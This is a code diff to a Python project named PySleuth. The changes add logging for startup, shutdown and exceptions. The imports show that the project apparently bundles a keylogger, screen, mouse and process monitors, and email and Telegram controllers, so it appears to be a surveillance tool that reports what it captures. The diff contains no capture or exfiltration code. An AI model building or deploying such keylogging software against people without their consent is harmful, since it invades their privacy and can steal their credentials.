@@ -1,8 +1,10 @@
 from .controllers.components import KeyLoggerController, ProcessMntrController, MouseMntrController, ScreenMntrController
 from .controllers.email import EmailController
 from .controllers.telegram import TelegramController
-
+from .core import output
 from . import config
+
+logger = output.Loggers.getMaster(__name__)
 
 
 class Struct:
@@ -20,6 +22,8 @@ class PySleuth:
 
         self.connectSlots()
 
+        logger.info("Firing up ...")
+
     def start(self):
         self.RUNNING = True
 
@@ -28,9 +32,9 @@ class PySleuth:
         try:
             self.telegramCtrl.startWorker()  # blocking !
         except KeyboardInterrupt:
-            pass
+            logger.error("User abort!", exc_info=True)
         except Exception as e:
-            print(e)
+            logger.critical("Uncaugh exception", exc_info=True)
         finally:
             self.onShutdown()
 
@@ -39,6 +43,8 @@ class PySleuth:
             self.RUNNING = False
 
         assert not self.RUNNING
+
+        logger.info("Shutting down")
 
     def __del__(self):
         self.onShutdown()
